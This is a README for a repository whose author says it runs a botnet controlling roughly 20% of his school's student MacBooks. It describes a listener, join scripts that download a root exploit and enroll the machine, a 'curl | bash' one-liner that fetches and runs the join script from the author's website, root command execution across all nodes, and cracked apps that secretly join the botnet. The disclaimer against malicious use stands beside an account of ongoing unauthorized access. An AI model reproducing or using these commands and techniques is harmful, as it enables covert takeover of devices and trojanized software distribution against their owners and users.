# net
Some code which I use to run a rudimentary botnet which controls roughly 20% of the MacBooks my school provides to students.

This code only really works with MacBooks using OS X 10.11.6 and before. The joining scripts make some assumptions about configuration since they're only designed to be run on GMHS MacBook Airs.

I do not endorse the use of this code for malicious purposes.

## How it works
### Listening
The botnet is controlled by a simple Python script which opens a socket on port `2043`. Currently the server simply listens for incoming connections and accepts data on new nodes, which are then stored in `nodes.txt`.

### Joining
Two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-run joining: it will download the exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically, which will handle joining the botnet. This mitigates the need to manually download the exploit, mark it as executable, run it, bla bla bla. Just run this script and you'll be good.

Here's a simple one-liner to join the botnet (all the scripts are up on my website for simplicity of URLs):

```sh
curl https://erikboesen.com/join.sh | bash
```

or if you like simple URLs:

```sh
curl -L erikboesen.com/join.sh | bash
```

### Controlling
Running `run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root. You can also run `up.sh` to view which/how many nodes are online.

### Apps
The `apps` directory contains some cracked versions of various applications which are blocked on our MacBooks. These versions will work on our MacBooks, but they will also join the computer that runs them to the botnet.

## Licensing
This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).
